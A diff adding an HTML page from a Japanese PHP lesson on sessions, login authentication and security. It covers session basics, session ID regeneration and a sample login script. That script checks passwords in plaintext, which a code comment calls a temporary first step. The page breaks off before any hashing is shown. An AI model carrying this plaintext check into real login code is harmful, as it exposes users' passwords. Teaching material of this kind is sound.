@@ -1,0 +1,519 @@
+<!DOCTYPE html><html lang="ja"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="modulepreload" href="/gs-textbook-php/assets/manifest-3e21a0cd.js"/><link rel="modulepreload" href="/gs-textbook-php/assets/entry.client-DtWayQEr.js"/><link rel="modulepreload" href="/gs-textbook-php/assets/root-DhgomBNp.js"/><link rel="modulepreload" href="/gs-textbook-php/assets/entry.client-DtWayQEr.js"/><link rel="modulepreload" href="/gs-textbook-php/assets/lessons._slug-DdYyauY5.js"/><link rel="modulepreload" href="/gs-textbook-php/assets/mermaid-vendor-CpAEI21m.js"/><link rel="modulepreload" href="/gs-textbook-php/assets/lessons-CuJlLEab.js"/><meta name="robots" content="noindex"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"/><title>Lessons</title><meta name="robots" content="index,follow"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"/><link rel="icon" href="https://g-s.dev/uploads/cropped-g-s_fabicon-2-32x32.png" sizes="32x32"/><link rel="icon" href="https://g-s.dev/uploads/cropped-g-s_fabicon-2-192x192.png" sizes="192x192"/><link rel="apple-touch-icon" href="https://g-s.dev/uploads/cropped-g-s_fabicon-2-180x180.png"/><link href="https://fonts.googleapis.com/css2?family=M+PLUS+1p:wght@100;300;400;500;700;800;900&amp;display=swap" rel="stylesheet"/><link rel="stylesheet" href="/gs-textbook-php/assets/root-C_FDEAqU.css"/><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&amp;display=swap"/><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css"/><script>
+              window.Prism = window.Prism || {};
+              window.Prism.manual = true;
+            </script></head><body style="font-family:&#x27;M PLUS 1p&#x27;"><div class="relative from-slate-200 bg-gradient-to-b to-slate-300"><div class="grid transition-all duration-300 ease-in-out" style="grid-template-columns:280px 1fr"><aside class="h-screen sticky top-0 transition-all duration-300 ease-in-out w-[280px] pr-4 overflow-hidden border-r border-gray-200 dark:border-gray-800 bg-white dark:bg-slate-800 px-4"><div class="py-2"><div class="flex items-center justify-between mb-3"><h2 class="text-sm font-semibold transition-opacity duration-300 ease-in-out opacity-100">授業資料一覧</h2><button class="p-1 hover:bg-slate-200 dark:hover:bg-slate-700 rounded transition-colors duration-200" title="折りたたみ"><svg class="w-4 h-4 transform transition-transform duration-300 ease-in-out" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg></button></div><div class="mb-3 px-2"><button class="flex items-center gap-2 w-full text-xs text-slate-600 dark:text-slate-400 hover:text-slate-800 dark:hover:text-slate-200 transition-colors duration-200 py-2 px-2 rounded hover:bg-slate-100 dark:hover:bg-slate-700" title="全て開く"><svg class="w-3 h-3 transition-transform duration-200 " fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg><span>全て開く</span></button></div><nav class="space-y-1 transition-opacity duration-300 ease-in-out opacity-100"></nav></div></aside><main class="prose dark:prose-invert max-w-none bg-white dark:bg-slate-800 rounded w-5xl p-12 my-4 
+  mx-auto"><div class="relative"><div style="display:block"><h1 class="text-3xl font-extrabold mb-4 text-slate-900 dark:text-slate-100 border-b border-slate-200 dark:border-slate-700 pb-2">#04 PHP - セッション・認証・セキュリティ</h1>
+<details class="rounded-lg border border-slate-200 dark:border-slate-700 px-4 py-4 my-4 hover:shadow transition outline-none focus:ring-0 focus:outline-none"><summary class="cursor-pointer select-none text-slate-700 dark:text-slate-300 hover:text-slate-900 dark:hover:text-slate-100 font-bold">今回のゴール</summary><div class="mt-6 text-slate-600 dark:text-slate-400"><ul class="mb-4 space-y-1 text-slate-700 dark:text-slate-300 pl-6 list-disc">
+<li class="relative ml-2">セッションとログイン認証の仕組みを理解する</li>
+<li class="relative ml-2">ハッシュ化によるパスワード保護を実装する</li>
+<li class="relative ml-2">セッションハイジャック攻撃とその対策を学ぶ</li>
+<li class="relative ml-2">実用的なユーザー認証システムを構築する</li>
+<li class="relative ml-2">セキュリティ意識を高め、安全なWebアプリケーション開発を身につける</li>
+</ul></div></details>
+<details class="rounded-lg border border-slate-200 dark:border-slate-700 px-4 py-4 my-4 hover:shadow transition outline-none focus:ring-0 focus:outline-none"><summary class="cursor-pointer select-none text-slate-700 dark:text-slate-300 hover:text-slate-900 dark:hover:text-slate-100 font-bold">授業前準備</summary><div class="mt-6 text-slate-600 dark:text-slate-400"><div class="my-6 p-4 rounded-lg border bg-green-50 dark:bg-green-900/20 border-green-200 dark:border-green-800 flex gap-3"><div class="flex-shrink-0"><svg class="w-5 h-5 text-green-600 dark:text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.663 17h4.673M12 3v1m6.364 1.636l-.707.707M21 12h-1M4 12H3m3.343-5.657l-.707-.707m2.828 9.9a5 5 0 117.072 0l-.548.547A3.374 3.374 0 0014 18.469V19a2 2 0 11-4 0v-.531c0-.895-.356-1.754-.988-2.386l-.548-.547z"></path></svg></div><div class="flex-1 min-w-0"><div class="font-semibold mb-1 text-green-800 dark:text-green-200">毎回の準備作業</div><div class="text-slate-700 dark:text-slate-300"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed">PHPの授業では毎回同じ手順で環境を準備します。今回はユーザー認証が加わります。</p></div></div></div><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">1. XAMPP起動</strong></p><ul class="mb-4 space-y-1 text-slate-700 dark:text-slate-300 pl-6 list-disc">
+<li class="relative ml-2"><strong class="font-semibold text-slate-900 dark:text-slate-100">Windows</strong>: Apache と MySQL が緑色</li>
+<li class="relative ml-2"><strong class="font-semibold text-slate-900 dark:text-slate-100">Mac</strong>: MySQL Database と Apache Web Server が &quot;Running&quot;</li>
+</ul><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">2. ファイル配置</strong></p><ul class="mb-4 space-y-1 text-slate-700 dark:text-slate-300 pl-6 list-disc">
+<li class="relative ml-2"><strong class="font-semibold text-slate-900 dark:text-slate-100">Windows</strong>: <code class="inline-block px-1.5 py-0.5 mx-0.5 text-sm font-mono bg-slate-100 dark:bg-slate-800 text-slate-800 dark:text-slate-200 rounded border border-slate-200 dark:border-slate-700">C:/XAMPP/htdocs/php03/</code></li>
+<li class="relative ml-2"><strong class="font-semibold text-slate-900 dark:text-slate-100">Mac</strong>: <code class="inline-block px-1.5 py-0.5 mx-0.5 text-sm font-mono bg-slate-100 dark:bg-slate-800 text-slate-800 dark:text-slate-200 rounded border border-slate-200 dark:border-slate-700">/Applications/XAMPP/htdocs/php03/</code></li>
+</ul><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">3. 動作確認</strong></p><ul class="mb-4 space-y-1 text-slate-700 dark:text-slate-300 pl-6 list-disc">
+<li class="relative ml-2"><code class="inline-block px-1.5 py-0.5 mx-0.5 text-sm font-mono bg-slate-100 dark:bg-slate-800 text-slate-800 dark:text-slate-200 rounded border border-slate-200 dark:border-slate-700">http://localhost/php03/</code> にアクセス</li>
+</ul></div></details>
+<h2 class="text-2xl font-semibold mb-3 mt-12 text-slate-800 dark:text-slate-200">セッション（SESSION）の基礎</h2>
+<details class="rounded-lg border border-slate-200 dark:border-slate-700 px-4 py-4 my-4 hover:shadow transition outline-none focus:ring-0 focus:outline-none"><summary class="cursor-pointer select-none text-slate-700 dark:text-slate-300 hover:text-slate-900 dark:hover:text-slate-100 font-bold">セッションとは何か？</summary><div class="mt-6 text-slate-600 dark:text-slate-400"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">セッション</strong>とは、ユーザーがWebサイトにアクセスしてから離脱するまでの一連の期間のことです。</p><div class="my-6 p-4 rounded-lg border bg-blue-50 dark:bg-blue-900/20 border-blue-200 dark:border-blue-800 flex gap-3"><div class="flex-shrink-0"><svg class="w-5 h-5 text-blue-600 dark:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg></div><div class="flex-1 min-w-0"><div class="font-semibold mb-1 text-blue-800 dark:text-blue-200">HTTPの根本的な問題</div><div class="text-slate-700 dark:text-slate-300"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed">HTTPは<strong class="font-semibold text-slate-900 dark:text-slate-100">ステートレス</strong>なプロトコルのため、各リクエストが独立していて、サーバーは前回のやりとりを覚えていません。</p></div></div></div><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">ステートレスの問題を体感してみましょう：</strong></p><div class="my-6 "><div class="infographic-content"><div class="space-y-3"><div class="flex items-start p-3 bg-red-50 rounded border border-red-200"><div class="w-6 h-6 text-red-600 mr-3 mt-0.5"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.082 15.5c-.77.833.192 2.5 1.732 2.5z"></path></svg></div><div><div class="font-medium text-slate-800">1. ログインページにアクセス</div><div class="text-sm text-slate-600">サーバー: 「はじめまして！」</div></div></div><div class="flex items-start p-3 bg-red-50 rounded border border-red-200"><div class="w-6 h-6 text-red-600 mr-3 mt-0.5"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.082 15.5c-.77.833.192 2.5 1.732 2.5z"></path></svg></div><div><div class="font-medium text-slate-800">2. ログイン処理を送信</div><div class="text-sm text-slate-600">サーバー: 「はじめまして！（誰だっけ？）」</div></div></div><div class="flex items-start p-3 bg-red-50 rounded border border-red-200"><div class="w-6 h-6 text-red-600 mr-3 mt-0.5"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.082 15.5c-.77.833.192 2.5 1.732 2.5z"></path></svg></div><div><div class="font-medium text-slate-800">3. 商品ページにアクセス</div><div class="text-sm text-slate-600">サーバー: 「はじめまして！（また知らない人だ）」</div></div></div></div></div></div><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed">これでは毎回ログインが必要になってしまいます！</p></div></details>
+<details class="rounded-lg border border-slate-200 dark:border-slate-700 px-4 py-4 my-4 hover:shadow transition outline-none focus:ring-0 focus:outline-none"><summary class="cursor-pointer select-none text-slate-700 dark:text-slate-300 hover:text-slate-900 dark:hover:text-slate-100 font-bold">セッションとCookieの仕組み</summary><div class="mt-6 text-slate-600 dark:text-slate-400"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">セッション</strong>と<strong class="font-semibold text-slate-900 dark:text-slate-100">Cookie</strong>を組み合わせることで、サーバー側でユーザー情報を管理できます。</p><div class="my-6 "><div class="infographic-content"><div class="space-y-4"><div class="text-center"><div class="inline-flex items-center justify-center w-16 h-16 bg-slate-100 rounded-full mb-4"><div class="w-8 h-8 text-slate-600"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z"></path></svg></div></div><div class="font-medium text-slate-800 mb-2">セッション管理の基本構造</div></div><div class="grid grid-cols-1 md:grid-cols-2 gap-6"><div class="p-4 bg-blue-50 rounded border border-blue-200"><div class="flex items-center mb-3"><div class="w-6 h-6 text-blue-600 mr-2"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg></div><div class="font-medium text-blue-800">Cookie（クッキー）</div></div><div class="text-sm text-blue-700"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong>役割:</strong> セッションIDを保存・送信<br/>
+<strong>保存場所:</strong> ブラウザ<br/>
+<strong>容量:</strong> 最大4KB程度<br/>
+<strong>内容:</strong> セッションIDのみ（データは含まない）</p></div></div><div class="p-4 bg-green-50 rounded border border-green-200"><div class="flex items-center mb-3"><div class="w-6 h-6 text-green-600 mr-2"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 12h14M5 12a2 2 0 01-2-2V6a2 2 0 012-2h6l2 2h6a2 2 0 012 2v4a2 2 0 01-2 2H5a2 2 0 01-2-2z"></path></svg></div><div class="font-medium text-green-800">セッション</div></div><div class="text-sm text-green-700"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong>役割:</strong> ユーザー情報を管理<br/>
+<strong>保存場所:</strong> サーバー<br/>
+<strong>容量:</strong> 制限なし<br/>
+<strong>内容:</strong> ユーザーID、権限、設定等</p></div></div></div></div></div></div><div class="my-6 p-4 rounded-lg border bg-blue-50 dark:bg-blue-900/20 border-blue-200 dark:border-blue-800 flex gap-3"><div class="flex-shrink-0"><svg class="w-5 h-5 text-blue-600 dark:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg></div><div class="flex-1 min-w-0"><div class="font-semibold mb-1 text-blue-800 dark:text-blue-200">重要なポイント</div><div class="text-slate-700 dark:text-slate-300"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed">Cookieには「セッションID」だけが保存され、実際のデータはサーバー側にあります。これにより、セキュリティを保ちながら状態を管理できます。</p></div></div></div><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">セッション管理のフロー：</strong></p><div class="my-6 p-4 rounded-lg border border-slate-200 dark:border-slate-700 bg-slate-50/30 dark:bg-slate-800/30"><div class="text-center text-slate-500 dark:text-slate-400 text-sm py-4">図表を読み込み中...</div><div class="text-center w-full flex justify-center hidden"></div></div></div></details>
+<details class="rounded-lg border border-slate-200 dark:border-slate-700 px-4 py-4 my-4 hover:shadow transition outline-none focus:ring-0 focus:outline-none"><summary class="cursor-pointer select-none text-slate-700 dark:text-slate-300 hover:text-slate-900 dark:hover:text-slate-100 font-bold">LocalStorageとの違い</summary><div class="mt-6 text-slate-600 dark:text-slate-400"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed">過去にLocalStorageを学習しましたが、セッションとの違いは何でしょうか？</p><div class="my-6 "><div class="infographic-content"><div class="grid grid-cols-1 md:grid-cols-2 gap-6"><div class="p-4 bg-orange-50 rounded border border-orange-200"><div class="flex items-center mb-3"><div class="w-6 h-6 text-orange-600 mr-2"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path></svg></div><div class="font-medium text-orange-800">LocalStorage</div></div><div class="text-sm text-orange-700"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong>実行場所:</strong> ブラウザ（クライアントサイド）<br/>
+<strong>データ保存:</strong> ブラウザ内<br/>
+<strong>セキュリティ:</strong> JavaScriptから読み取り可能<br/>
+<strong>用途:</strong> 設定、一時的なデータ保存</p></div></div><div class="p-4 bg-green-50 rounded border border-green-200"><div class="flex items-center mb-3"><div class="w-6 h-6 text-green-600 mr-2"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 12h14M5 12a2 2 0 01-2-2V6a2 2 0 012-2h6l2 2h6a2 2 0 012 2v4a2 2 0 01-2 2H5a2 2 0 01-2-2z"></path></svg></div><div class="font-medium text-green-800">PHP セッション</div></div><div class="text-sm text-green-700"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong>実行場所:</strong> サーバー（サーバーサイド）<br/>
+<strong>データ保存:</strong> サーバー内<br/>
+<strong>セキュリティ:</strong> サーバー側で管理、高セキュリティ<br/>
+<strong>用途:</strong> ユーザー認証、機密情報管理</p></div></div></div></div></div><div class="my-6 p-4 rounded-lg border bg-green-50 dark:bg-green-900/20 border-green-200 dark:border-green-800 flex gap-3"><div class="flex-shrink-0"><svg class="w-5 h-5 text-green-600 dark:text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.663 17h4.673M12 3v1m6.364 1.636l-.707.707M21 12h-1M4 12H3m3.343-5.657l-.707-.707m2.828 9.9a5 5 0 117.072 0l-.548.547A3.374 3.374 0 0014 18.469V19a2 2 0 11-4 0v-.531c0-.895-.356-1.754-.988-2.386l-.548-.547z"></path></svg></div><div class="flex-1 min-w-0"><div class="font-semibold mb-1 text-green-800 dark:text-green-200">使い分けの指針</div><div class="text-slate-700 dark:text-slate-300"><ul class="mb-4 space-y-1 text-slate-700 dark:text-slate-300 pl-6 list-disc">
+<li class="relative ml-2"><strong class="font-semibold text-slate-900 dark:text-slate-100">LocalStorage</strong>: ユーザー設定、フォーム入力の一時保存</li>
+<li class="relative ml-2"><strong class="font-semibold text-slate-900 dark:text-slate-100">セッション</strong>: ログイン状態、権限管理、機密情報</li>
+</ul></div></div></div></div></details>
+<details class="rounded-lg border border-slate-200 dark:border-slate-700 px-4 py-4 my-4 hover:shadow transition outline-none focus:ring-0 focus:outline-none"><summary class="cursor-pointer select-none text-slate-700 dark:text-slate-300 hover:text-slate-900 dark:hover:text-slate-100 font-bold">セッションの基本操作</summary><div class="mt-6 text-slate-600 dark:text-slate-400"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">セッションIDの取得と確認：</strong></p><div><div class="group relative my-4 rounded-lg overflow-hidden border border-slate-200 dark:border-slate-700"><button class="absolute right-2 top-2 rounded bg-slate-800/70 px-2 py-1 text-xs text-white opacity-0 transition-opacity group-hover:opacity-100 z-10">コピー</button><pre class="language-php !m-0 !p-4 !bg-slate-900 dark:!bg-slate-950 !text-slate-100 overflow-x-auto"><code class="language-php">&lt;?php
+// session01.php
+// セッション開始
+session_start();
+
+// セッションIDを取得
+$sid = session_id();
+echo &quot;セッションID: &quot; . $sid;
+?&gt;
+</code></pre></div></div><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">セッションに変数を格納：</strong></p><div><div class="group relative my-4 rounded-lg overflow-hidden border border-slate-200 dark:border-slate-700"><button class="absolute right-2 top-2 rounded bg-slate-800/70 px-2 py-1 text-xs text-white opacity-0 transition-opacity group-hover:opacity-100 z-10">コピー</button><pre class="language-php !m-0 !p-4 !bg-slate-900 dark:!bg-slate-950 !text-slate-100 overflow-x-auto"><code class="language-php">&lt;?php
+// セッションに値を保存
+$_SESSION[&quot;name&quot;] = &quot;どんぶラッコ&quot;;
+$_SESSION[&quot;age&quot;] = 29;
+$_SESSION[&quot;login_time&quot;] = date(&quot;Y-m-d H:i:s&quot;);
+
+echo &quot;セッションにデータを保存しました&quot;;
+?&gt;
+</code></pre></div></div><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">別のページでセッションデータを取得：</strong></p><div><div class="group relative my-4 rounded-lg overflow-hidden border border-slate-200 dark:border-slate-700"><button class="absolute right-2 top-2 rounded bg-slate-800/70 px-2 py-1 text-xs text-white opacity-0 transition-opacity group-hover:opacity-100 z-10">コピー</button><pre class="language-php !m-0 !p-4 !bg-slate-900 dark:!bg-slate-950 !text-slate-100 overflow-x-auto"><code class="language-php">&lt;?php
+// session02.php
+session_start();
+
+// セッションからデータを取得
+$name = $_SESSION[&quot;name&quot;];
+$age = $_SESSION[&quot;age&quot;];
+$login_time = $_SESSION[&quot;login_time&quot;];
+
+echo &quot;名前: &quot; . $name . &quot;&lt;br&gt;&quot;;
+echo &quot;年齢: &quot; . $age . &quot;&lt;br&gt;&quot;;
+echo &quot;ログイン時刻: &quot; . $login_time;
+?&gt;
+</code></pre></div></div><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">セッションの保存場所確認：</strong>
+<code class="inline-block px-1.5 py-0.5 mx-0.5 text-sm font-mono bg-slate-100 dark:bg-slate-800 text-slate-800 dark:text-slate-200 rounded border border-slate-200 dark:border-slate-700">http://localhost/dashboard/phpinfo.php</code> にアクセスして <code class="inline-block px-1.5 py-0.5 mx-0.5 text-sm font-mono bg-slate-100 dark:bg-slate-800 text-slate-800 dark:text-slate-200 rounded border border-slate-200 dark:border-slate-700">session.save_path</code> を確認してみましょう。</p><div class="my-6 p-4 rounded-lg border bg-blue-50 dark:bg-blue-900/20 border-blue-200 dark:border-blue-800 flex gap-3"><div class="flex-shrink-0"><svg class="w-5 h-5 text-blue-600 dark:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg></div><div class="flex-1 min-w-0"><div class="font-semibold mb-1 text-blue-800 dark:text-blue-200">セッションファイルの場所</div><div class="text-slate-700 dark:text-slate-300"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed">セッションデータは実際のファイルとしてサーバーに保存されます。セッションIDに対応するファイル名で管理されています。</p></div></div></div><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">セッションIDの再発行（セキュリティ対策）：</strong></p><div><div class="group relative my-4 rounded-lg overflow-hidden border border-slate-200 dark:border-slate-700"><button class="absolute right-2 top-2 rounded bg-slate-800/70 px-2 py-1 text-xs text-white opacity-0 transition-opacity group-hover:opacity-100 z-10">コピー</button><pre class="language-php !m-0 !p-4 !bg-slate-900 dark:!bg-slate-950 !text-slate-100 overflow-x-auto"><code class="language-php">&lt;?php
+// セッション固定攻撃を防ぐため、ログイン時にIDを再発行
+session_regenerate_id(true); // trueで古いセッションファイルを削除
+?&gt;
+</code></pre></div></div></div></details>
+<h2 class="text-2xl font-semibold mb-3 mt-12 text-slate-800 dark:text-slate-200">ユーザー認証システムの実装</h2>
+<details class="rounded-lg border border-slate-200 dark:border-slate-700 px-4 py-4 my-4 hover:shadow transition outline-none focus:ring-0 focus:outline-none"><summary class="cursor-pointer select-none text-slate-700 dark:text-slate-300 hover:text-slate-900 dark:hover:text-slate-100 font-bold">認証システムの全体像</summary><div class="mt-6 text-slate-600 dark:text-slate-400"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed">今回実装する認証システムの流れを理解しましょう：</p><div class="my-6 p-4 rounded-lg border border-slate-200 dark:border-slate-700 bg-slate-50/30 dark:bg-slate-800/30"><div class="text-center text-slate-500 dark:text-slate-400 text-sm py-4">図表を読み込み中...</div><div class="text-center w-full flex justify-center hidden"></div></div><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">認証システムの特徴：</strong></p><div class="my-6 "><div class="infographic-content"><div class="space-y-3"><div class="flex items-start p-3 bg-slate-50 rounded border border-slate-200"><div class="w-6 h-6 text-blue-600 mr-3 mt-0.5"><div class="text-lg font-bold">1</div></div><div><div class="font-medium text-slate-800">ログイン処理</div><div class="text-sm text-slate-600">データベースでユーザー情報を照合</div></div></div><div class="flex items-start p-3 bg-slate-50 rounded border border-slate-200"><div class="w-6 h-6 text-green-600 mr-3 mt-0.5"><div class="text-lg font-bold">2</div></div><div><div class="font-medium text-slate-800">セッション管理</div><div class="text-sm text-slate-600">ログイン状態をセッションで保持</div></div></div><div class="flex items-start p-3 bg-slate-50 rounded border border-slate-200"><div class="w-6 h-6 text-orange-600 mr-3 mt-0.5"><div class="text-lg font-bold">3</div></div><div><div class="font-medium text-slate-800">アクセス制御</div><div class="text-sm text-slate-600">未ログインユーザーを保護</div></div></div><div class="flex items-start p-3 bg-slate-50 rounded border border-slate-200"><div class="w-6 h-6 text-purple-600 mr-3 mt-0.5"><div class="text-lg font-bold">4</div></div><div><div class="font-medium text-slate-800">権限管理</div><div class="text-sm text-slate-600">管理者・一般ユーザーの区別</div></div></div></div></div></div></div></details>
+<details class="rounded-lg border border-slate-200 dark:border-slate-700 px-4 py-4 my-4 hover:shadow transition outline-none focus:ring-0 focus:outline-none"><summary class="cursor-pointer select-none text-slate-700 dark:text-slate-300 hover:text-slate-900 dark:hover:text-slate-100 font-bold">ログイン処理の実装</summary><div class="mt-6 text-slate-600 dark:text-slate-400"><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">login_act.php（ログイン認証処理）：</strong></p><div><div class="group relative my-4 rounded-lg overflow-hidden border border-slate-200 dark:border-slate-700"><button class="absolute right-2 top-2 rounded bg-slate-800/70 px-2 py-1 text-xs text-white opacity-0 transition-opacity group-hover:opacity-100 z-10">コピー</button><pre class="language-php !m-0 !p-4 !bg-slate-900 dark:!bg-slate-950 !text-slate-100 overflow-x-auto"><code class="language-php">&lt;?php
+session_start();
+include(&quot;funcs.php&quot;);
+
+// 1. POSTデータ取得
+$lid = $_POST[&quot;lid&quot;];  // ログインID
+$lpw = $_POST[&quot;lpw&quot;];  // ログインパスワード
+
+// 2. DB接続
+$pdo = db_conn();
+
+// 3. データ登録SQL作成（最初は平文パスワードで確認）
+$stmt = $pdo-&gt;prepare(&quot;SELECT * FROM gs_user_table WHERE lid = :lid AND lpw = :lpw&quot;);
+$stmt-&gt;bindValue(&#x27;:lid&#x27;, $lid, PDO::PARAM_STR);
+$stmt-&gt;bindValue(&#x27;:lpw&#x27;, $lpw, PDO::PARAM_STR);
+$status = $stmt-&gt;execute();
+
+// 4. SQL実行時にエラーがある場合の処理
+if ($status == false) {
+    sql_error($stmt);
+}
+
+// 5. 抽出データ数を取得
+$val = $stmt-&gt;fetch();
+
+// 6. 該当レコードがあればSESSIONに値を代入
+if ($val[&#x27;id&#x27;] != &quot;&quot;) {
+    // Login成功時
+    $_SESSION[&#x27;chk_ssid&#x27;]  = session_id();
+    $_SESSION[&#x27;kanri_flg&#x27;] = $val[&#x27;kanri_flg&#x27;];
+    $_SESSION[&#x27;name&#x27;]      = $val[&#x27;name&#x27;];
+    $_SESSION[&#x27;user_id&#x27;]   = $val[&#x27;id&#x27;];
+    
+    // セッションIDを再発行（セキュリティ対策）
+    session_regenerate_id(true);
+    $_SESSION[&#x27;chk_ssid&#x27;] = session_id();
+    
+    redirect(&#x27;select.php&#x27;);
+} else {
+    // Login失敗時
+    redirect(&#x27;login.php&#x27;);
+}
+?&gt;
+</code></pre></div></div><p class="my-2 text-slate-700 dark:text-slate-300 leading-relaxed"><strong class="font-semibold text-slate-900 dark:text-slate-100">重要なポイント：</strong></p><div class="my-6 "><div class="infographic-content"><div class="space-y-3"><div class="flex items-start p-3 bg-blue-50 rounded border border-blue-200"><div class="w-6 h-6 text-blue-600 mr-3 mt-0.5"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg></div><div><div class="font-medium text-slate-800">chk_ssid</div><div class="text-sm text-slate-600">セッションIDを保存してログイン状態を確認</div></div></div><div class="flex items-start p-3 bg-green-50 rounded border border-green-200"><div class="w-6 h-6 text-green-600 mr-3 mt-0.5"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z"></path></svg></div><div><div class="font-medium text-slate-800">kanri_flg</div><div class="text-sm text-slate-600">管理者権限フラグ（0=一般、1=管理者）</div></div></div><div class="flex items-start p-3 bg-orange-50 rounded border border-orange-200"><div class="w-6 h-6 text-orange-600 mr-3 mt-0.5"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 